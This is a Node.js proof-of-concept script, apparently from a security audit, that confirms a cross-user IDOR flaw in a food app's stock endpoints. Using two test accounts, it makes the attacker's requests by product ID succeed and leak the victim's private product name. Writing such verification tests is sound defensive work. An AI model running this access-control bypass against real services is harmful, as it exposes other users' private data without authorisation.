// §7 🔴 IDOR on stock endpoints.
// SetStockStateAsync / AddStockAsync only check Products.AnyAsync(Id) — NOT ownership.
// Attacker B can reference victim A's PRIVATE (user-created) productId and pull A's
// product (with A's chosen name) into B's own overview.
//
// RecipeService.cs:121-139 (SetStockStateAsync/AddStockAsync) vs :154-156 (search is ownership-scoped).
//
// Run: node 01-idor-stock.mjs
import { provision, api } from '../_lib/provision.mjs'

const A = await provision({ email: 'adv.t06.victim@gmail.com' })
const B = await provision({ email: 'adv.t06.attacker@gmail.com' })

// A creates a PRIVATE product via free-text stock-by-name (IsSystem=0, CreatedByUserId=A).
const secretName = 'VICTIM_SECRET_' + Date.now()
const create = await api('POST', '/api/food/stock-by-name', { token: A.token, body: { name: secretName } })
const pid = create.json?.productId
console.log(`A created private product id=${pid} name="${secretName}" created=${create.json?.created}`)

// B should NOT be able to find it by name (search is ownership-scoped) ...
const bSearch = await api('POST', '/api/food/stock-by-name', { token: B.token, body: { name: secretName } })
console.log(`B stock-by-name("${secretName}") -> created=${bSearch.json?.created} pid=${bSearch.json?.productId} (new private dup, isolated — expected)`)

// ... but B references A's private productId DIRECTLY via PUT /stock/{pid}.
const put = await api('PUT', `/api/food/stock/${pid}`, { token: B.token, body: { state: 'Available' } })
console.log(`B PUT /api/food/stock/${pid} -> HTTP ${put.status} (expected 400/403/404; got ${put.status})`)

// And via POST /stock/{pid} (addStock).
const post = await api('POST', `/api/food/stock/${pid}`, { token: B.token })
console.log(`B POST /api/food/stock/${pid} -> HTTP ${post.status}`)

// B's overview now leaks A's private product name.
const ov = await api('GET', '/api/food/overview', { token: B.token })
const leaked = (ov.json?.products || []).find((p) => p.id === pid)
console.log(`B overview contains pid=${pid}? ${leaked ? 'YES — name="' + leaked.nameUk + '"' : 'no'}`)
const inStock = (ov.json?.stock || []).some((s) => s.productId === pid)
console.log(`B overview stock references pid=${pid}? ${inStock}`)

const confirmed = put.status === 200 && leaked && leaked.nameUk === secretName
console.log('\n' + (confirmed
  ? `CONFIRMED: cross-user IDOR. Observed: B set state on A's private product ${pid} (HTTP ${put.status}) and now reads A's name "${leaked.nameUk}". Expected: 403/404 (not owner / system).`
  : `NOT CONFIRMED (put=${put.status}, leaked=${!!leaked})`))
